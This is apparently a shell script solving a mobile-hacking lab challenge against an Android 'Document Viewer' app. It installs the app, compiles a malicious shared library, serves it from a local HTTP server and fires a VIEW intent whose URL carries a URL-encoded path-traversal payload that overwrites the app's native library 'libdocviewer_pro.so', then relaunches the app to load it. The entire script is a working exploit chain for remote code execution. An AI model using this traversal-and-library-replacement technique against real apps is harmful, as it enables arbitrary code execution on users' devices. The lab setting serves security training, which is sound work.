NDK="${HOME}/Library/Android/sdk/ndk/28.2.13676358"
TAG_HOST='darwin-x86_64'
TAG_TARGET='aarch64-linux-android'
API="$(apkanalyzer manifest min-sdk com.mobilehackinglab.documentviewer.apk)"
PAYLOAD="$(sed 's|/|%2f|g' <<< '../../../../data/data/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/libdocviewer_pro.so')"

adb install com.mobilehackinglab.documentviewer.apk
${NDK}/toolchains/llvm/prebuilt/${TAG_HOST}/bin/${TAG_TARGET}${API}-clang++ -shared -static-libstdc++ -o exploit.so exploit.cpp
python3 http_server.py &> /dev/null &
adb shell "am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d http://10.0.2.2:8080/${PAYLOAD}"
adb shell 'am start -n com.mobilehackinglab.documentviewer/.MainActivity'
adb shell 'ls /data/data/com.mobilehackinglab.documentviewer/files/'

